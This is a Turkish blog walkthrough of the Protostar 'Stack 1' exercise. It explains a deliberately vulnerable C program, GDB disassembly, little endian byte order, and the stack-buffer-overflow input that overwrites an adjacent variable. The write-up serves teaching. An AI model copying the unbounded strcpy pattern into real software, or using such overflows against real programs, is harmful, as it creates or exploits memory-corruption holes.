@@ -1,0 +1,224 @@
+<!doctype html><html lang=tr-tr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=stylesheet href=/style.css><link rel=icon type=image/png href=/favicon.png><meta http-equiv=cache-control content=public><meta name=description content="Burada bir şey yok"><title>Stack 1 | Emir (0xF61)</title><script async src="https://www.googletagmanager.com/gtag/js?id=UA-135684308-2"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','UA-135684308-2');</script></head><body><nav><ul class=menu>|<li><a href=/>Ana Sayfa</a></li>|<li><a href=/yaz%C4%B1lar/>Yazılar</a></li>|<li><a href=/etiketler/>Etiketler</a></li>|<li><a href=/linkler/>Linkler</a></li>|<li><a href=/ara/>Ara</a></li>|</ul><hr></nav><div class=article-meta></div><span class=rtime>📖 7 dakika</span>
+<a href=..>↪ Protostar</a><h1 class=baslik>Stack 1</h1><main><h2 id=stack1-c>Stack1.c</h2><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e></span>
+<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv)
+{
+  <span style=color:#66d9ef>volatile</span> <span style=color:#66d9ef>int</span> modified;
+  <span style=color:#66d9ef>char</span> buffer[<span style=color:#ae81ff>64</span>];
+
+  <span style=color:#66d9ef>if</span>(argc <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) {
+      errx(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;please specify an argument</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+  }
+
+  modified <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+  strcpy(buffer, argv[<span style=color:#ae81ff>1</span>]);
+
+  <span style=color:#66d9ef>if</span>(modified <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x61626364</span>) {
+      printf(<span style=color:#e6db74>&#34;you have correctly got the variable to the right value</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+  } <span style=color:#66d9ef>else</span> {
+      printf(<span style=color:#e6db74>&#34;Try again, you got 0x%08x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, modified);
+  }
+}</code></pre></div><p><strong>Amaç:</strong> &ldquo;you have correctly got the variable to the right value&rdquo; satırını yazdırmak.</p><p>Bu seviyede de istediğiğimiz cümleyi yazdırabilmek için programın akışını daha
+spesifik bir şekilde değiştirmemiz gerekiyor. Önceki seviyede <em>modified</em>
+değişkeni <em>0</em> haricinde bir değer olması yeterken şimdi <em>0x61626364</em> değerine
+eşit olması gerekmekte.</p><h2 id=programın-çalıştırılması>Programın çalıştırılması</h2><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>user@protostar:/opt/protostar/bin$ ./stack1
+stack1: please specify an argument
+
+user@protostar:/opt/protostar/bin$ ./stack1 Merhaba
+Try again, you got 0x00000000</code></pre></div><p>Program çalıştırıldığı zaman bir önceki seviyedeki gibi herhangi bir input
+beklemeden argüman belirtiniz çıktısı veriyor. Herhangi bir argüman verdiğim
+zaman ise Tekrar deneyin diyip o anki modified değişkeninin değerini hex olarak
+yazdırıyor. Bu seviyeyide aynı şekilde uzun bir değer verdikten sonra
+geçebiliriz. Fakat gdb (gnu debugger)&lsquo;dan bahsetmek istiyorum. GDB ile bir
+programı açıp satır satır assembly kodlarını inceleyebilir, değişiklik yapabilir
+veya programın akışını değiştirebiliriz.</p><h2 id=gdb-ve-at-t-sentaks>GDB ve AT&amp;T Sentaks</h2><p>Aşağıdaki çıktıyı biraz yorumlayarak basitleştirmek gerekirse. Sol taraftaki
+<em>0x</em> ile başlayan 16lı tabanındaki sayılar, sağ tarafındaki opcode ve
+argüman(lar)&lsquo;ın saklandığı hafıza adresleridir.</p><p>Şuan sağdaki argümanlar biraz göz korkutucu görünebilir bunun yerine şu anda
+varsayılan olan AT&amp;T sentaksını intel ile değiştireceğim.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>user@protostar:/opt/protostar/bin$ gdb stack1
+Reading symbols from /opt/protostar/bin/stack1...done.
+<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> b main
+Breakpoint <span style=color:#ae81ff>1</span> at 0x804846d: file stack1/stack1.c, line <span style=color:#ae81ff>11</span>.
+<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> disassemble main
+Dump of assembler code <span style=color:#66d9ef>for</span> <span style=color:#66d9ef>function</span> main:
+0x08048464 &lt;main+0&gt;:    push   %ebp
+0x08048465 &lt;main+1&gt;:    mov    %esp,%ebp
+0x08048467 &lt;main+3&gt;:    and    $0xfffffff0,%esp
+0x0804846a &lt;main+6&gt;:    sub    $0x60,%esp
+0x0804846d &lt;main+9&gt;:    cmpl   $0x1,0x8<span style=color:#f92672>(</span>%ebp<span style=color:#f92672>)</span>
+0x08048471 &lt;main+13&gt;:   jne    0x8048487 &lt;main+35&gt;
+0x08048473 &lt;main+15&gt;:   movl   $0x80485a0,0x4<span style=color:#f92672>(</span>%esp<span style=color:#f92672>)</span>
+0x0804847b &lt;main+23&gt;:   movl   $0x1,<span style=color:#f92672>(</span>%esp<span style=color:#f92672>)</span>
+0x08048482 &lt;main+30&gt;:   call   0x8048388 &lt;errx@plt&gt;
+0x08048487 &lt;main+35&gt;:   movl   $0x0,0x5c<span style=color:#f92672>(</span>%esp<span style=color:#f92672>)</span>
+0x0804848f &lt;main+43&gt;:   mov    0xc<span style=color:#f92672>(</span>%ebp<span style=color:#f92672>)</span>,%eax
+0x08048492 &lt;main+46&gt;:   add    $0x4,%eax
+0x08048495 &lt;main+49&gt;:   mov    <span style=color:#f92672>(</span>%eax<span style=color:#f92672>)</span>,%eax
+0x08048497 &lt;main+51&gt;:   mov    %eax,0x4<span style=color:#f92672>(</span>%esp<span style=color:#f92672>)</span>
+0x0804849b &lt;main+55&gt;:   lea    0x1c<span style=color:#f92672>(</span>%esp<span style=color:#f92672>)</span>,%eax
+0x0804849f &lt;main+59&gt;:   mov    %eax,<span style=color:#f92672>(</span>%esp<span style=color:#f92672>)</span>
+0x080484a2 &lt;main+62&gt;:   call   0x8048368 &lt;strcpy@plt&gt;
+0x080484a7 &lt;main+67&gt;:   mov    0x5c<span style=color:#f92672>(</span>%esp<span style=color:#f92672>)</span>,%eax
+0x080484ab &lt;main+71&gt;:   cmp    $0x61626364,%eax
+0x080484b0 &lt;main+76&gt;:   jne    0x80484c0 &lt;main+92&gt;
+0x080484b2 &lt;main+78&gt;:   movl   $0x80485bc,<span style=color:#f92672>(</span>%esp<span style=color:#f92672>)</span>
+0x080484b9 &lt;main+85&gt;:   call   0x8048398 &lt;puts@plt&gt;
+0x080484be &lt;main+90&gt;:   jmp    0x80484d5 &lt;main+113&gt;
+0x080484c0 &lt;main+92&gt;:   mov    0x5c<span style=color:#f92672>(</span>%esp<span style=color:#f92672>)</span>,%edx
+0x080484c4 &lt;main+96&gt;:   mov    $0x80485f3,%eax
+0x080484c9 &lt;main+101&gt;:  mov    %edx,0x4<span style=color:#f92672>(</span>%esp<span style=color:#f92672>)</span>
+0x080484cd &lt;main+105&gt;:  mov    %eax,<span style=color:#f92672>(</span>%esp<span style=color:#f92672>)</span>
+0x080484d0 &lt;main+108&gt;:  call   0x8048378 &lt;printf@plt&gt;
+0x080484d5 &lt;main+113&gt;:  leave
+0x080484d6 &lt;main+114&gt;:  ret
+End of assembler dump.</code></pre></div><h2 id=gdb-intel-sentaks>GDB İntel Sentaks</h2><p>Intel sentaksına geçmek için gdb de <code>set disassembly-flavor intel</code> yazıp
+tekrardan main fonksiyonunun makina kodlarını assembly kodlarına çeviriyorum.
+-disassemble-</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> set disassembly-flavor intel
+<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> disassemble main
+Dump of assembler code <span style=color:#66d9ef>for</span> <span style=color:#66d9ef>function</span> main:
+0x08048464 &lt;main+0&gt;:    push   ebp
+0x08048465 &lt;main+1&gt;:    mov    ebp,esp
+0x08048467 &lt;main+3&gt;:    and    esp,0xfffffff0
+0x0804846a &lt;main+6&gt;:    sub    esp,0x60
+0x0804846d &lt;main+9&gt;:    cmp    DWORD PTR <span style=color:#f92672>[</span>ebp+0x8<span style=color:#f92672>]</span>,0x1
+0x08048471 &lt;main+13&gt;:   jne    0x8048487 &lt;main+35&gt;
+0x08048473 &lt;main+15&gt;:   mov    DWORD PTR <span style=color:#f92672>[</span>esp+0x4<span style=color:#f92672>]</span>,0x80485a0
+0x0804847b &lt;main+23&gt;:   mov    DWORD PTR <span style=color:#f92672>[</span>esp<span style=color:#f92672>]</span>,0x1
+0x08048482 &lt;main+30&gt;:   call   0x8048388 &lt;errx@plt&gt;
+0x08048487 &lt;main+35&gt;:   mov    DWORD PTR <span style=color:#f92672>[</span>esp+0x5c<span style=color:#f92672>]</span>,0x0
+0x0804848f &lt;main+43&gt;:   mov    eax,DWORD PTR <span style=color:#f92672>[</span>ebp+0xc<span style=color:#f92672>]</span>
+0x08048492 &lt;main+46&gt;:   add    eax,0x4
+0x08048495 &lt;main+49&gt;:   mov    eax,DWORD PTR <span style=color:#f92672>[</span>eax<span style=color:#f92672>]</span>
+0x08048497 &lt;main+51&gt;:   mov    DWORD PTR <span style=color:#f92672>[</span>esp+0x4<span style=color:#f92672>]</span>,eax
+0x0804849b &lt;main+55&gt;:   lea    eax,<span style=color:#f92672>[</span>esp+0x1c<span style=color:#f92672>]</span>
+0x0804849f &lt;main+59&gt;:   mov    DWORD PTR <span style=color:#f92672>[</span>esp<span style=color:#f92672>]</span>,eax
+0x080484a2 &lt;main+62&gt;:   call   0x8048368 &lt;strcpy@plt&gt;
+0x080484a7 &lt;main+67&gt;:   mov    eax,DWORD PTR <span style=color:#f92672>[</span>esp+0x5c<span style=color:#f92672>]</span>
+0x080484ab &lt;main+71&gt;:   cmp    eax,0x61626364
+0x080484b0 &lt;main+76&gt;:   jne    0x80484c0 &lt;main+92&gt;
+0x080484b2 &lt;main+78&gt;:   mov    DWORD PTR <span style=color:#f92672>[</span>esp<span style=color:#f92672>]</span>,0x80485bc
+0x080484b9 &lt;main+85&gt;:   call   0x8048398 &lt;puts@plt&gt;
+0x080484be &lt;main+90&gt;:   jmp    0x80484d5 &lt;main+113&gt;
+0x080484c0 &lt;main+92&gt;:   mov    edx,DWORD PTR <span style=color:#f92672>[</span>esp+0x5c<span style=color:#f92672>]</span>
+0x080484c4 &lt;main+96&gt;:   mov    eax,0x80485f3
+0x080484c9 &lt;main+101&gt;:  mov    DWORD PTR <span style=color:#f92672>[</span>esp+0x4<span style=color:#f92672>]</span>,edx
+0x080484cd &lt;main+105&gt;:  mov    DWORD PTR <span style=color:#f92672>[</span>esp<span style=color:#f92672>]</span>,eax
+0x080484d0 &lt;main+108&gt;:  call   0x8048378 &lt;printf@plt&gt;
+0x080484d5 &lt;main+113&gt;:  leave
+0x080484d6 &lt;main+114&gt;:  ret
+End of assembler dump.</code></pre></div><p>Virgül yerine boşluk görmek ve registerların başında <em>%</em> görmemek okumayı
+kolaylaştırıyor. İki sentaksın aralarındaki tek fark bu değil aynı zamanda
+assign yani atama yapılan yerde değişiyor.</p><p><strong>Intel Sentaks</strong>
+| opcode | hedef,kaynak |
+| mov | eax,[ecx] |</p><p><strong>AT&amp;T Sentaks</strong>
+| opcode | kaynak,hedef |
+| movl | (%ecx),%eax |</p><h2 id=modified-değişkenini-değiştirilmesi>Modified Değişkenini Değiştirilmesi</h2><p>Aşağıdaki gibi bir kaç şekilde stack1 programına argüman yollayabiliriz.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>user@protostar:/opt/protostar/bin$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA <span style=color:#75715e>#64 tane A</span>
+Try again, you got 0x00000000
+user@protostar:/opt/protostar/bin$ ./stack1 <span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#34;print(&#39;A&#39;*64)&#34;</span><span style=color:#66d9ef>)</span>
+Try again, you got 0x00000000
+user@protostar:/opt/protostar/bin$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC
+Try again, you got 0x00000043
+user@protostar:/opt/protostar/bin$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCC
+Try again, you got 0x43434343
+user@protostar:/opt/protostar/bin$ ./stack1 <span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#34;print(&#39;A&#39;*64+&#39;CCCC&#39;)&#34;</span><span style=color:#66d9ef>)</span>
+Try again, you got 0x43434343
+user@protostar:/opt/protostar/bin$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADEFG
+Try again, you got 0x47464544</code></pre></div><p>Bir önceki seviyede olduğu gibi 64 tane A(0x41) harfiyle bufferi dolduruyorum.
+Bunu daha kısa bir şekilde pythondan yardım alarak doldurabileceğimi
+söylemiştim. Burada dikkat çekmek istediğim son iki örnekte modified variable
+yerine istediğimi yazdırabiliyor oluşum. Fakat yazdırırken dikkat etmem gereken
+bir nokta sondan bir önceki 64 tane A ve <em>bir</em> tane C olan örnekte değerim
+<strong>0x00000043</strong> olması. Yani benim her modified değişkenine yazdığım harf tersten
+gözüküyor bunun sebebi bizim <em>Big Endian</em> olarak düşünmemiz ama makinaların
+<strong>Little Endian</strong> olarak çalışmasından kaynaklanıyor. Aralarındaki temel fark en
+kıymetli bitin solda yada sağda olmasıdır.</p><p>Madem istediğimiz şekilde modified değişkenini değiştirebiliyoruz o zaman bizden
+istenen değeri yazmayı deniyelim. [[#Stack1.c|Stack1.c]]&lsquo;deki
+<code>if(modified==0x61626364)</code> değerine bakacak olursak. <em>0x61626364</em> değerini
+modified değişkenine yazmak için bu sayıların ascii karşılığına pythondan yardım
+alarak buluyorum.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>$ python3
+Python <span style=color:#ae81ff>3</span>.7.1 <span style=color:#f92672>(</span>default, Oct <span style=color:#ae81ff>22</span> <span style=color:#ae81ff>2018</span>, <span style=color:#ae81ff>10</span>:41:28<span style=color:#f92672>)</span>
+<span style=color:#f92672>[</span>GCC <span style=color:#ae81ff>8</span>.2.1 <span style=color:#ae81ff>20180831</span><span style=color:#f92672>]</span> on linux
+&gt;&gt;&gt; chr<span style=color:#f92672>(</span>0x61<span style=color:#f92672>)</span>
+<span style=color:#e6db74>&#39;a&#39;</span>
+&gt;&gt;&gt; chr<span style=color:#f92672>(</span>0x62<span style=color:#f92672>)</span>
+<span style=color:#e6db74>&#39;b&#39;</span>
+&gt;&gt;&gt; chr<span style=color:#f92672>(</span>0x63<span style=color:#f92672>)</span>
+<span style=color:#e6db74>&#39;c&#39;</span>
+&gt;&gt;&gt; chr<span style=color:#f92672>(</span>0x64<span style=color:#f92672>)</span>
+<span style=color:#e6db74>&#39;d&#39;</span></code></pre></div><p>Demek ki ben 64lük buffer&rsquo;ı doldurduktan sonra <em>abcd</em> yazarsam bölümü
+geçebilirim.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>user@protostar:/opt/protostar/bin$ ./stack1 <span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#34;print(&#39;A&#39;*64+&#39;abcd&#39;)&#34;</span><span style=color:#66d9ef>)</span>
+Try again, you got 0x64636261</code></pre></div><p><strong>Little Endian</strong>&lsquo;a dikkat ederek :)</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>user@protostar:/opt/protostar/bin$ ./stack1 <span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#34;print(&#39;A&#39;*64+&#39;dcba&#39;)&#34;</span><span style=color:#66d9ef>)</span>
+you have correctly got the variable to the right value</code></pre></div><hr><h2 id=gdb-hook-stop>GDB hook-stop</h2><p>GDB&rsquo;de hook-stop denilen programın akışı her durdurulduğunda istediğimiz
+komutları sanki o komutları yazmışız gibi çalıştıran bir komut seti kuralı
+yazabiliriz.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> define hook-stop
+Type commands <span style=color:#66d9ef>for</span> definition of <span style=color:#e6db74>&#34;hook-stop&#34;</span>.
+End with a line saying just <span style=color:#e6db74>&#34;end&#34;</span>.
+&gt;info registers <span style=color:#75715e># register&#39;ların durumunu gösterir</span>
+&gt;x/i $eip <span style=color:#75715e># bir sonraki çalıştırılacak komutu gösterir</span>
+&gt;x/16wx $esp <span style=color:#75715e># Stack&#39;in durumunu 16word olarak gösterir</span>
+&gt;end</code></pre></div><p><strong>1 word 4byte olarak gdb içinde tanımlanmıştır.</strong></p><p><a href=../stack0>Stack 0</a>&lsquo;da bahsettiğim gibi stack lokal değişkenlerin tutulduğu bir
+veri yapısıdır. Bu sayede bir programın içerisinde aynı değişken ismi farklı
+fonksiyonlar içerisinde yer alabilir.</p><p>Örnek vermek gerekirse programın içinde birden fazla <em>i</em> değişkeni olmasına
+rağmen bir fonksiyonun içerisinde sadece tek <em>i</em> değişkeni bulunabilir. Bunun
+olmasını sağlayan stack frame denilen, her fonksiyon için kendine ait bir stack
+alanının bulunmasıdır.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>user@protostar:/opt/protostar/bin$ gdb stack1 -q <span style=color:#75715e># -q Banneri görmemek için</span>
+Reading symbols from /opt/protostar/bin/stack1...done.
+<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> set disassembly-flavor intel
+<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> define hook-stop
+Type commands <span style=color:#66d9ef>for</span> definition of <span style=color:#e6db74>&#34;hook-stop&#34;</span>.
+End with a line saying just <span style=color:#e6db74>&#34;end&#34;</span>.
+&gt;info registers
+&gt;x/i $eip
+&gt;x/16wx $esp
+&gt;end
+<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
+eax            0x61626364       <span style=color:#ae81ff>1633837924</span>
+ecx            0x0      <span style=color:#ae81ff>0</span>
+edx            0x45     <span style=color:#ae81ff>69</span>
+ebx            0xb7fd7ff4       -1208123404
+esp            0xbffff6f0       0xbffff6f0
+ebp            0xbffff758       0xbffff758
+esi            0x0      <span style=color:#ae81ff>0</span>
+edi            0x0      <span style=color:#ae81ff>0</span>
+eip            0x80484b9        0x80484b9 &lt;main+85&gt;
+eflags         0x200246 <span style=color:#f92672>[</span> PF ZF IF ID <span style=color:#f92672>]</span>
+cs             0x73     <span style=color:#ae81ff>115</span>
+ss             0x7b     <span style=color:#ae81ff>123</span>
+ds             0x7b     <span style=color:#ae81ff>123</span>
+es             0x7b     <span style=color:#ae81ff>123</span>
+fs             0x0      <span style=color:#ae81ff>0</span>
+gs             0x33     <span style=color:#ae81ff>51</span>
+0x80484b9 &lt;main+85&gt;:    call   0x8048398 &lt;puts@plt&gt;
+0xbffff6f0:     0x080485bc      0xbffff93e      0xb7fff8f8      0xb7f0186e
+0xbffff700:     0xb7fd7ff4      0xb7ec6165      0xbffff718      0x41414141
+0xbffff710:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff720:     0x41414141      0x41414141      0x41414141      0x41414141
+0x080484b9      <span style=color:#ae81ff>19</span>      in stack1/stack1.c
+<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> ni
+...
+... Aşağıdaki mesajı görene kadar ni yazıp stacke bakalım
+...
+you have correctly got the variable to the right value
+<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/24wx $esp
+0xbffff6f0:     0x080485bc      0xbffff93e      0xb7fff8f8      0xb7f0186e
+0xbffff700:     0xb7fd7ff4      0xb7ec6165      0xbffff718      0x41414141
+0xbffff710:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff720:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff730:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff740:     0x41414141      0x41414141      0x41414141      0x61626364</code></pre></div><p>Görüldüğü gibi 4 satır 0x41414141 ile dolu ve en sonda da bizim <em>0x61626364</em>
+yazdığımız dcba değeri bulunmakta. Her bir 0x41414141 4 byte olup toplam 16 tane
+word olduğunu hesaplarsak bu programdaki 64byte olan buffer&rsquo;ı doldurduğumuzu
+görebiliriz. Sonrasındaki <em>0x61626364</em> modified değişkeni oluyor.</p><p>Bunu şu şekilde ispatlayabiliriz sadece 64byte&rsquo;lık bir payload ile
+çalıştırdığımızda stackteki modified değişkeninin bulunduğu adresin 0 olmasını
+bekleriz.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>... Üstteki gdb örneğinin aynısı. Sadece 68byte yerine
+... 64byte<span style=color:#960050;background-color:#1e0010>&#39;</span>lık payload verdim.
+
+<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/24wx $esp
+0xbffff6f0:     0xbffff70c      0xbffff942      0xb7fff8f8      0xb7f0186e
+0xbffff700:     0xb7fd7ff4      0xb7ec6165      0xbffff718      0x41414141
+0xbffff710:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff720:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff730:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff740:     0x41414141      0x41414141      0x41414141      0x00000000</code></pre></div></main><footer><hr><a href=/index.xml>Feed</a></footer></body></html>
